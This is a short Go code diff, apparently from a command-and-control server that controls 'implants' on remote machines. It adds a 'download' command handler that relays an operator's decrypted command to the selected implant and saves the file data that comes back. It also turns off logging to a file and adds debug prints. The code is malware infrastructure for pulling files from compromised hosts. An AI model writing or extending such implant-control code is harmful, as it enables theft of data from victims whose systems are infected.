@@ -45,7 +45,7 @@ func main() {
 	}
 	defer logFile.Close()
 
-	log.SetOutput(logFile)
+	//log.SetOutput(logFile)
 	log.Println("Starting the application")
 
 	// Run Health Checks
@@ -207,6 +207,12 @@ func handleNewConnectionRemote(conn net.Conn) {
 			flattened := strings.Join(lines, "\n")
 			sendResponseRemote(conn, flattened)
 			continue
+		}
+		if strings.HasPrefix(decryptedCommand, "download") {
+			fmt.Println("We dl")
+			resp := handleImplantCommand(currentClient, command)
+			fmt.Println(resp)
+			saveFile(command, resp)
 		}
 		if currentClient == nil {
 			sendResponseRemote(conn, "No implant selected")
